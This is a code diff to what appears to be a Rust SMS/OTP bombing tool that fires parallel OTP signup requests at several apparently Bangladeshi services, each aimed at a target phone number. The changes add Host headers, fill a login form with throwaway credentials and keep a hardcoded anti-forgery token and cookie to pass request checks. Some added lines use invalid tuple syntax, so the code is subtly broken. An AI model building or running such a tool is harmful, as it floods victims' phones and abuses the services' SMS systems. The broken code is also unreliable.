@@ -345,6 +345,9 @@ let api_results = parallel![
         &[
             ("X-Parse-Application-Id", "munchiesbd"),
             ("X-Parse-REST-API-Key",   "munchiesbd"),
+             ("x-parse-application-id": "food"),
+        
+
         ]
     ),
 
@@ -420,9 +423,11 @@ let api_results = parallel![
 
     // ── Ghoori Learning ──
     fire("Ghoori Learning",
-        "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
+        "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
         json!({"mobile_no": number}),
-        &[("Referer", "https://ghoorilearning.com/")]
+        &[
+            ("Host": "api.ghoorilearning.com"),
+            ("Referer", "https://ghoorilearning.com/")]
     ),
 
     // ── ExpressHub ──
@@ -439,7 +444,8 @@ let api_results = parallel![
     fire("Pharmaid RX",
         "https://shop.pharmaid-rx.com/api/sendSMSRegistration",
         json!({"mobileNumber": number}),
-        &[("User-Agent", "Mozilla/5.0")]
+        &[("User-Agent", "Mozilla/5.0"),
+         ("Host": "shop.pharmaid-rx.com")]
     ),
 
     // ── Practice Club ──
@@ -459,7 +465,7 @@ let api_results = parallel![
     // ── PBS BD ──
     fire("PBS BD",
         "https://pbs.com.bd/login/?handler=UserGetOtp",
-        json!({"UserName": "", "UserPassword": "", "MobileNo": number}),
+        json!({"UserName": "Teamdanderous", "UserPassword": "Tushar", "MobileNo": number}),
         &[
             ("XSRF-Token", "CfDJ8C8FhGbSUB1CplCwhmaw48FrjIGNq5sPRk0G6VzBicZtPJrEXDCoqGMiBTb3Fetxypt-480avEXqJS_WJVdEWQeDCz0mKIQO4odODIqIopHM8qh50R7CF3bOGHOtF22Pt-pgeyMhHQTk2t2inqJMRyw"),
             ("Cookie", ".AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8C8FhGbSUB1CplCwhmaw48HSKnE-hppep13XT5NAyk3laCHJb_oP0B1wPBZQP-hzP8Z2CAclzIeEqkFAMeWJS8xWzyiIMY_sMlsO7WzVcxmONd9WUDnzazvUlK9zFOY8h6Pwx1xsDD9fgtr2ltr9qHE;")
